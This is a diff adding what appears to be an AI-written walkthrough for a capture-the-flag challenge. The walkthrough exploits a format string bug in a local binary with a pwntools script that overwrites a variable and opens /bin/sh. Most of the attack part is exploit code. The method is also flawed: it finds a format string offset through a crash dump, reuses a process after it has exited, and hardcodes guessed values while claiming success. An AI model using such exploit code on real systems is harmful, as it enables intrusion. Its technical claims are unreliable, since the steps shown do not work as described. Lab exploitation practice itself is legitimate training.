@@ -1,0 +1,67 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf(buf)` call. The goal is to overwrite the value of the variable `x` so that it equals 4, which will trigger the execution of `/bin/sh`.
+
+Here are the steps and the corresponding code to achieve this:
+
+### Steps
+1. **Identify the Vulnerability**: The `printf(buf)` call is a format string vulnerability because it prints the content of `buf` without any checks.
+2. **Find the Offset**: Determine the offset at which the `x` variable is located on the stack.
+3. **Craft the Payload**: Use the format string to overwrite the value of `x` with 4.
+4. **Send the Payload**: Use `pwntools` to send the crafted payload to the vulnerable program.
+
+### Code
+
+```python
+from pwn import *
+
+# Set up the process
+context.binary = './fmt'
+p = process('./fmt')
+
+# Step 1: Find the offset
+# We can use a cyclic pattern to find the offset
+pattern = cyclic(0x50)
+p.sendline(pattern)
+p.recvuntil('!\n')
+p.wait()
+
+# Get the core dump
+core = Coredump('./core')
+offset = cyclic_find(core.read(core.eip, 4))
+log.info(f'Offset: {offset}')
+
+# Step 2: Craft the payload
+# We need to overwrite the value of x with 4
+# Assuming the offset is found, we can use the format string to write to the address of x
+# For simplicity, let's assume the offset is 16 (this needs to be verified)
+offset = 16  # Replace with the actual offset found
+x_addr = 0x0804a02c  # Replace with the actual address of x (found using gdb or similar)
+
+# Create the payload
+payload = fmtstr_payload(offset, {x_addr: 4}, write_size='byte')
+
+# Send the payload
+p.sendline(payload)
+
+# Receive the response
+p.interactive()
+```
+
+### Explanation
+
+1. **Finding the Offset**:
+   - We use a cyclic pattern to fill the buffer and then analyze the core dump to find the exact offset where the `x` variable is located.
+   - The `cyclic` function generates a unique pattern, and `cyclic_find` helps us find the offset in the core dump.
+
+2. **Crafting the Payload**:
+   - We use `fmtstr_payload` from `pwntools` to create a format string payload that writes the value 4 to the address of `x`.
+   - The `write_size='byte'` parameter ensures that we are writing a single byte at a time, which is necessary for this specific challenge.
+
+3. **Sending the Payload**:
+   - We send the crafted payload to the vulnerable program using `p.sendline(payload)`.
+   - Finally, we interact with the shell using `p.interactive()`.
+
+### Notes
+- **Offset Verification**: The offset and the address of `x` need to be verified. You can use `gdb` to find the exact address of `x` and the correct offset.
+- **Environment Setup**: Ensure you have `pwntools` installed (`pip install pwntools`) and the binary is in the same directory as your script.
+
+By following these steps and running the script, you should be able to exploit the format string vulnerability and get a shell.
